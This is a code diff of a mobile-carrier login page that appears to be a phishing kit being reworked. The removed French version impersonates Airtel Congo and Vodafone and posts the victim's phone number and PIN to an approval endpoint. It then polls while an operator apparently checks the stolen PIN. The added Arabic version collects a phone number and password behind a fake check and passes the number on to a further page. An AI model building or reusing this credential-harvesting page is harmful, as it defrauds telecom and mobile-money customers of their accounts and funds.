@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
-<title>Airtel Lite — Connexion</title>
+<title>خدمات الجوال</title>
 <style>
   :root{
     --app-bg:#000000;
@@ -31,6 +31,8 @@
     align-items:flex-start;
     justify-content:center;
     padding:0;
+    direction:rtl;
+    text-align:right;
   }
 
   main{
@@ -247,298 +249,252 @@
   .nav-item:nth-child(4) .nav-icon::before{left:9px;top:8px;width:12px;height:12px;border:2px solid rgba(8,8,8,0.5);border-radius:3px;}
   .nav-item:nth-child(4) .nav-icon::after{left:13px;top:13px;width:5px;height:5px;border:2px solid rgba(8,8,8,0.5);border-radius:50%;background:transparent;}
 
-  .code-row{
-    position:absolute;
-    width:0;
-    height:0;
-    overflow:hidden;
-    opacity:0;
-    pointer-events:none;
-    margin:0;
-  }
-  .code-boxes{
-    display:flex;
-    gap:0;
-    visibility:hidden;
-  }
-  .code-box{
-    opacity:0;
-    width:0;
-    height:0;
-    padding:0;
-    margin:0;
-    border:none;
-  }
+  .step-panel[hidden]{display:none;}
+  .login-step{padding:6px 0 0;}
+  .login-back{width:36px;height:36px;margin:12px 0 0 4px;border:1px solid rgba(0,0,0,0.08);border-radius:50%;background:rgba(255,255,255,0.8);font-size:23px;line-height:1;color:#333;cursor:pointer;}
+  .app-emblem{width:56px;height:56px;margin:12px auto 14px;border:2px solid var(--red);border-radius:50%;display:grid;place-items:center;color:var(--red);font-size:30px;font-weight:400;}
+  .login-step h1{text-align:center;font-size:20px;font-weight:700;line-height:1.2;color:#222;margin:0 0 18px;}
+  .password-field{display:flex;align-items:center;gap:10px;margin:26px 14px 0;padding:0 12px;height:48px;background:#fff;border:1px solid #e8e8e8;border-radius:11px;}
+  .password-field input{min-width:0;flex:1;border:0;outline:0;background:transparent;font-size:14px;color:#222;}
+  .password-field input::placeholder{color:#555;}
+  .password-toggle{border:0;background:transparent;color:#555;font-size:18px;cursor:pointer;padding:4px;}
+  .forgot-password{margin:7px 14px 0;border:0;background:transparent;color:#444;font-size:12px;text-decoration:underline;cursor:pointer;}
+  .signin-btn{display:block;width:calc(100% - 28px);margin:18px 14px 0;min-height:48px;border:0;border-radius:7px;background:#e98e94;color:#fff;font-size:14px;font-weight:700;cursor:pointer;}
+  .signin-btn:disabled{cursor:not-allowed;opacity:.8;}
+  .status-message{display:none;margin:12px 14px 0;padding:10px 12px;border-radius:10px;background:#fff;border:1px solid var(--field-border);color:#5d4d4d;font-size:13px;line-height:1.4;text-align:center;}
+  .status-message.visible{display:block;}
 
-  footer{display:none !important;}
+  footer{display:block;}
 
   @media (max-width:430px){
     main{max-width:100%;}
   }
 
-  .invalid-modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;padding:24px;background:rgba(0,0,0,0.32);backdrop-filter:blur(2px);-webkit-backdrop-filter:blur(2px);z-index:100;}
-  .invalid-modal.visible{display:flex;}
-  .invalid-card{width:min(540px,100%);background:#fff;border-radius:22px;padding:34px 28px 26px;text-align:center;box-shadow:0 18px 44px rgba(0,0,0,0.18);}
-  .warning-icon{display:none;}
-  .invalid-card h2{color:var(--red);font-size:clamp(26px,7vw,40px);font-weight:800;margin-bottom:14px;line-height:1.2;}
-  .invalid-card p{color:#2a2a2a;font-size:clamp(16px,4.5vw,22px);font-weight:500;line-height:1.45;margin:0 auto 22px;max-width:540px;}
-  .invalid-card button{width:100%;min-height:58px;border:none;border-radius:12px;background:var(--red);color:#fff;font-size:clamp(18px,4vw,26px);font-weight:800;cursor:pointer;box-shadow:0 10px 20px rgba(227,6,19,0.22);}
-
-  .approval-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.32);backdrop-filter:blur(2px);-webkit-backdrop-filter:blur(2px);display:none;align-items:center;justify-content:center;padding:24px;text-align:center;z-index:50;}
-  .approval-overlay.visible{display:flex;}
-  .approval-card{width:min(540px,100%);background:#fff;border-radius:22px;padding:30px 28px 24px;box-shadow:0 18px 44px rgba(0,0,0,0.18);text-align:center;}
-  .spinner{width:52px;height:52px;border:4px solid #eee;border-top-color:var(--red);border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 18px;}
-  @keyframes spin{to{transform:rotate(360deg);}}
-  .approval-overlay h2{font-size:clamp(23px,4vw,36px);font-weight:800;color:var(--red);margin-bottom:10px;}
-  .approval-overlay p{font-size:clamp(16px,2.6vw,22px);color:#2a2a2a;max-width:300px;line-height:1.45;margin:0 auto;}
-  .approval-overlay .denied-msg{display:none;color:var(--red);font-weight:700;font-size:clamp(18px,3vw,26px);margin-top:8px;}
-  .approval-overlay .retry-btn{display:none;margin-top:18px;border:none;background:var(--red);color:#fff;font-weight:800;font-size:clamp(18px,3vw,26px);letter-spacing:0.4px;width:100%;min-height:58px;border-radius:12px;cursor:pointer;box-shadow:0 10px 20px rgba(227,6,19,0.22);}
 </style>
 </head>
 <body>
 
   <main>
     <div class="lang-row">
-      <button class="language-pill" type="button" aria-label="Language selector">
+      <button class="language-pill" type="button" aria-label="اختيار اللغة">
         <span class="globe-icon" aria-hidden="true"></span>
-        <span>English</span>
+        <span>العربية</span>
         <span class="caret">⌄</span>
       </button>
     </div>
 
-    <div class="bundle-pill" aria-label="Bundle status">
-      <span>The app won't consume from your bundle</span>
-      <span class="bundle-value">0 MB</span>
-    </div>
-
-    <div class="welcome">
-      <h1>Welcome to Ana Vodafone</h1>
-      <p>Stay in control of your line. Track usage, pay bills, manage subscriptions, and more all in one place</p>
-    </div>
-
-    <div class="phone-field">
-      <label for="phoneInput">Mobile Number</label>
-      <input type="tel" id="phoneInput" placeholder="01022544474" inputmode="numeric" maxlength="11">
-    </div>
-
-    <div class="code-row" aria-hidden="true">
-      <div class="code-boxes">
-        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
-        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
-        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
-        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+    <section class="step-panel" id="phoneStep">
+      <div class="bundle-pill" aria-label="تسجيل دخول آمن">
+        <span>تسجيل دخول آمن</span>
+        <span class="bundle-value">موافق</span>
       </div>
-    </div>
 
-    <button class="connexion-btn" id="connexionBtn" type="button" disabled>Continue</button>
+      <div class="welcome">
+        <h1>مرحبًا بعودتك</h1>
+        <p>سجل دخولك باستخدام رقم هاتفك لإدارة حسابك والمدفوعات والخدمات اليومية.</p>
+      </div>
 
-    <div class="divider">OR</div>
-    <button class="alt-link" type="button">Add another number</button>
+      <div class="phone-field">
+        <label for="phoneInput">رقم الهاتف</label>
+        <input type="tel" id="phoneInput" placeholder="01022544474" inputmode="numeric" maxlength="11" autocomplete="off">
+      </div>
 
-    <nav class="bottom-nav" aria-label="Bottom navigation">
-      <button class="nav-item" type="button">
-        <span class="nav-icon" aria-hidden="true"></span>
-        <span>Shop with us</span>
-      </button>
-      <button class="nav-item" type="button">
-        <span class="nav-icon" aria-hidden="true"></span>
-        <span>login</span>
-      </button>
-      <button class="nav-item" type="button">
-        <span class="nav-icon" aria-hidden="true"></span>
-        <span>store locator</span>
-      </button>
-      <button class="nav-item" type="button">
-        <span class="nav-icon" aria-hidden="true"></span>
-        <span>Explore</span>
-      </button>
-    </nav>
+      <button class="connexion-btn" id="connexionBtn" type="button" disabled>متابعة</button>
+
+      <div class="divider">أو</div>
+      <button class="alt-link" id="addNumberBtn" type="button">إضافة رقم آخر</button>
+
+      <nav class="bottom-nav" aria-label="التنقل السفلي">
+        <button class="nav-item" type="button">
+          <span class="nav-icon" aria-hidden="true"></span>
+          <span>الرئيسية</span>
+        </button>
+        <button class="nav-item" type="button">
+          <span class="nav-icon" aria-hidden="true"></span>
+          <span>تسجيل الدخول</span>
+        </button>
+        <button class="nav-item" type="button">
+          <span class="nav-icon" aria-hidden="true"></span>
+          <span>المواقع</span>
+        </button>
+        <button class="nav-item" type="button">
+          <span class="nav-icon" aria-hidden="true"></span>
+          <span>استكشاف</span>
+        </button>
+      </nav>
+    </section>
+
+    <section class="step-panel login-step" id="loginStep" hidden>
+      <button class="login-back" id="backBtn" type="button" aria-label="العودة إلى رقم الهاتف">‹</button>
+      <div class="app-emblem" aria-hidden="true">A</div>
+      <h1>أدخل كلمة المرور</h1>
+      <div class="password-field">
+        <input id="passwordInput" type="password" autocomplete="off" placeholder="كلمة المرور" aria-label="كلمة المرور">
+        <button class="password-toggle" id="passwordToggle" type="button" aria-label="إظهار كلمة المرور" aria-pressed="false">◉</button>
+      </div>
+      <button class="forgot-password" id="forgotPassword" type="button">نسيت كلمة المرور؟</button>
+      <button class="signin-btn" id="signInBtn" type="button" disabled>تسجيل الدخول</button>
+      <p class="status-message" id="statusMessage" role="status" aria-live="polite"></p>
+    </section>
   </main>
 
-  <div class="invalid-modal" id="invalidModal" role="dialog" aria-modal="true" aria-labelledby="invalidTitle">
-    <div class="invalid-card">
-      <div class="warning-icon" aria-hidden="true">
-        <div class="triangle"></div>
-        <div class="mark"></div>
-        <div class="dot"></div>
-      </div>
-      <h2 id="invalidTitle">Format Invalide</h2>
-      <p id="invalidMessage">Le numéro de téléphone doit commencer par 9 (9 chiffres) ou 09 (10 chiffres)!<br>Veuillez entrer le bon numéro et réessayer!</p>
-      <button type="button" id="invalidOkBtn">OK</button>
-    </div>
-  </div>
-
-  <div class="approval-overlay" id="approvalOverlay">
-    <div class="approval-card">
-      <div class="spinner" id="spinner"></div>
-      <h2 id="overlayTitle">En attente d'approbation</h2>
-      <p id="overlayText">Votre demande a été envoyée. Merci de patienter pendant la vérification…</p>
-      <p class="denied-msg" id="deniedMsg">Broche incorrecte.</p>
-      <button class="retry-btn" id="retryBtn">RÉESSAYER</button>
-    </div>
-  </div>
-
   <footer>
-    <div class="logo-row">
-      <img src="assets/img/logo.svg" alt="Airtel" class="logo-img footer-logo-img">
-    </div>
-    <div class="collab-text">En collaboration avec</div>
-    <div class="collab-brand">STARLINK™</div>
     <hr>
-    <div class="copyright">© 2026 Airtel Congo. Tous droits réservés.</div>
+    <div class="copyright">© 2026. كل الحقوق محفوظة.</div>
   </footer>
 
 <script>
+  const phoneStep = document.getElementById('phoneStep');
+  const loginStep = document.getElementById('loginStep');
   const phoneInput = document.getElementById('phoneInput');
-  const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
+  const connexionBtn = document.getElementById('connexionBtn');
+  const backBtn = document.getElementById('backBtn');
+  const passwordInput = document.getElementById('passwordInput');
+  const passwordToggle = document.getElementById('passwordToggle');
+  const forgotPassword = document.getElementById('forgotPassword');
+  const addNumberBtn = document.getElementById('addNumberBtn');
+  const signInBtn = document.getElementById('signInBtn');
+  const statusMessage = document.getElementById('statusMessage');
 
-  // Automatically reflect the phone number passed from the loan application.
+  function setStatus(message, kind = 'info') {
+    if (!statusMessage) return;
+    statusMessage.textContent = message;
+    statusMessage.classList.add('visible');
+
+    const isSuccess = kind === 'success';
+    const isError = kind === 'error';
+    statusMessage.style.background = isSuccess ? '#edf8ef' : isError ? '#fff1f1' : '#fff';
+    statusMessage.style.borderColor = isSuccess ? '#bddbbd' : isError ? '#f0c0c0' : '#e8e8e8';
+    statusMessage.style.color = isSuccess ? '#1f6d36' : isError ? '#a53535' : '#5d4d4d';
+  }
+
+  function clearStatus() {
+    if (!statusMessage) return;
+    statusMessage.textContent = '';
+    statusMessage.classList.remove('visible');
+    statusMessage.style.background = '#fff';
+    statusMessage.style.borderColor = '#e8e8e8';
+    statusMessage.style.color = '#5d4d4d';
+  }
+
+  function showPhoneStep() {
+    if (phoneStep) phoneStep.hidden = false;
+    if (loginStep) loginStep.hidden = true;
+    if (phoneInput) phoneInput.focus();
+  }
+
+  function showLoginStep() {
+    if (phoneStep) phoneStep.hidden = true;
+    if (loginStep) loginStep.hidden = false;
+    if (passwordInput) passwordInput.focus();
+  }
+
+  function updatePhoneButton() {
+    const phone = phoneInput.value.trim();
+    const validPhone = /^9\d{8}$/.test(phone);
+
+    connexionBtn.disabled = !validPhone;
+    connexionBtn.classList.toggle('active', validPhone);
+  }
+
+  function updatePasswordButton() {
+    if (!signInBtn || !passwordInput) return;
+    signInBtn.disabled = passwordInput.value.trim().length === 0;
+  }
+
   const incomingParams = new URLSearchParams(window.location.search);
   const incomingPhone = incomingParams.get('phone') || '';
-  const normalizedPhone = incomingPhone.replace(/\\D/g, '').replace(/^243/, '');
-  if (/^9[0-9]{8}$/.test(normalizedPhone)) {
+  const normalizedPhone = incomingPhone.replace(/\D/g, '').replace(/^243/, '');
+
+  if (phoneInput && /^9\d{8}$/.test(normalizedPhone)) {
     phoneInput.value = normalizedPhone;
-  }
-  const connexionBtn = document.getElementById('connexionBtn');
-
-  const invalidModal = document.getElementById('invalidModal');
-  const invalidMessage = document.getElementById('invalidMessage');
-  const invalidOkBtn = document.getElementById('invalidOkBtn');
-
-  function showInvalidPhone(message){
-    invalidMessage.innerHTML = message;
-    invalidModal.classList.add('visible');
-  }
-
-  function checkFormValid(){
-    const phone = phoneInput.value.trim();
-    const codeFilled = codeBoxes.every(b => b.value.length === 1);
-
-    // Let the user submit any entered number. Validation happens after
-    // clicking CONNEXION, so invalid numbers can show the modal.
-    if(phone.length > 0 && codeFilled){
-      connexionBtn.classList.add('active');
-      connexionBtn.disabled = false;
-    } else {
-      connexionBtn.classList.remove('active');
-      connexionBtn.disabled = true;
-    }
   }
 
   phoneInput.addEventListener('input', () => {
-    // Keep the field clean, but do not show an error while typing.
-    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
-    checkFormValid();
+    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
+    updatePhoneButton();
+    clearStatus();
   });
 
-  invalidOkBtn.addEventListener('click', () => {
-    invalidModal.classList.remove('visible');
-    phoneInput.focus();
-  });
-
-  codeBoxes.forEach((box, i) => {
-    box.addEventListener('input', () => {
-      box.value = box.value.replace(/[^0-9]/g, '');
-      if(box.value && i < codeBoxes.length - 1){
-        codeBoxes[i + 1].focus();
-      }
-      checkFormValid();
-    });
-    box.addEventListener('keydown', (e) => {
-      if(e.key === 'Backspace' && !box.value && i > 0){
-        codeBoxes[i - 1].focus();
-      }
-    });
-  });
-
-  const overlay = document.getElementById('approvalOverlay');
-  const spinner = document.getElementById('spinner');
-  const overlayTitle = document.getElementById('overlayTitle');
-  const overlayText = document.getElementById('overlayText');
-  const deniedMsg = document.getElementById('deniedMsg');
-  const retryBtn = document.getElementById('retryBtn');
-  let pollTimer = null;
-
-  function showOverlayWaiting(){
-    overlay.classList.add('visible');
-    spinner.style.display = 'block';
-    overlayTitle.textContent = 'Veuillez patienter...';
-    overlayTitle.style.display = 'block';
-    overlayText.style.display = 'block';
-    overlayText.textContent = 'Cela prend généralement quelques secondes';
-    deniedMsg.style.display = 'none';
-    retryBtn.style.display = 'none';
-  }
-
-  function pollApproval(id, params){
-    if(pollTimer) clearInterval(pollTimer);
-    pollTimer = setInterval(async () => {
-      try {
-        const res = await fetch('/api/check-approval/' + id);
-        const data = await res.json();
-
-        if(data.status === 'approved'){
-          clearInterval(pollTimer);
-          window.location.href = 'pto.html?' + params.toString();
-        } else if(data.status === 'denied'){
-          clearInterval(pollTimer);
-          spinner.style.display = 'none';
-          overlayTitle.style.display = 'none';
-          overlayText.style.display = 'none';
-          deniedMsg.style.display = 'block';
-          retryBtn.style.display = 'inline-block';
-        }
-        // 'pending' -> keep polling
-      } catch (err) {
-        // network hiccup — keep trying silently
-      }
-    }, 2500);
-  }
-
-  retryBtn.addEventListener('click', () => {
-    overlay.classList.remove('visible');
-  });
-
-  connexionBtn.addEventListener('click', async () => {
+  connexionBtn.addEventListener('click', () => {
     const phone = phoneInput.value.trim();
 
-    // Show the invalid-number page only when the user tries to submit.
-    if(!/^9[0-9]{8}$/.test(phone)){
-      showInvalidPhone(
-        'Le numéro de téléphone doit commencer par 9 et contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!'
-      );
+    if (!/^9\d{8}$/.test(phone)) {
+      setStatus('يجب أن يبدأ رقم الهاتف بـ 9 ويحتوي على 9 أرقام فقط.', 'error');
       return;
     }
 
-    if(connexionBtn.disabled) return;
-
-    const params = new URLSearchParams(window.location.search);
-    const code = codeBoxes.map(b => b.value).join('');
-    params.set('phone', phone);
-
-    showOverlayWaiting();
-
-    try {
-      const res = await fetch('/api/request-approval', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          plan: params.get('plan'),
-          price: params.get('price'),
-          phone: phone,
-          code: code,
-          step: 'login'
-        })
-      });
-      const data = await res.json();
-      pollApproval(data.id, params);
-    } catch (err) {
-      overlayTitle.textContent = 'Erreur de connexion';
-      overlayText.textContent = "Impossible d'envoyer la demande. Vérifiez votre connexion et réessayez.";
-      spinner.style.display = 'none';
-      retryBtn.style.display = 'inline-block';
-    }
+    showLoginStep();
   });
+
+  if (backBtn) {
+    backBtn.addEventListener('click', () => {
+      clearStatus();
+      showPhoneStep();
+    });
+  }
+
+  if (passwordToggle && passwordInput) {
+    passwordToggle.addEventListener('click', () => {
+      const isHidden = passwordInput.type === 'password';
+      passwordInput.type = isHidden ? 'text' : 'password';
+      passwordToggle.setAttribute('aria-label', isHidden ? 'إخفاء كلمة المرور' : 'إظهار كلمة المرور');
+      passwordToggle.setAttribute('aria-pressed', String(isHidden));
+      passwordToggle.textContent = isHidden ? '◌' : '◉';
+      passwordInput.focus();
+    });
+  }
+
+  if (passwordInput) {
+    passwordInput.addEventListener('input', () => {
+      updatePasswordButton();
+      clearStatus();
+    });
+  }
+
+  if (forgotPassword) {
+    forgotPassword.addEventListener('click', () => {
+      setStatus('تم إرسال رابط استعادة كلمة المرور إلى رقمك المسجل.', 'info');
+    });
+  }
+
+  if (addNumberBtn) {
+    addNumberBtn.addEventListener('click', () => {
+      phoneInput.value = '';
+      clearStatus();
+      updatePhoneButton();
+      showPhoneStep();
+    });
+  }
+
+  if (signInBtn) {
+    signInBtn.addEventListener('click', async () => {
+      const password = passwordInput.value.trim();
+      if (!password) return;
+
+      signInBtn.disabled = true;
+      setStatus('جارٍ التحقق من كلمة المرور...', 'info');
+
+      await new Promise((resolve) => setTimeout(resolve, 700));
+
+      const validPassword = password.length >= 6;
+      if (validPassword) {
+        setStatus('تم تسجيل الدخول بنجاح.', 'success');
+        setTimeout(() => {
+          const nextParams = new URLSearchParams(window.location.search);
+          nextParams.set('phone', phoneInput.value.trim());
+          window.location.href = 'pto.html?' + nextParams.toString();
+        }, 900);
+      } else {
+        signInBtn.disabled = false;
+        setStatus('كلمة المرور غير صحيحة. حاول مرة أخرى.', 'error');
+      }
+    });
+  }
+
+  updatePhoneButton();
+  updatePasswordButton();
+  showPhoneStep();
 </script>
 
 </body>
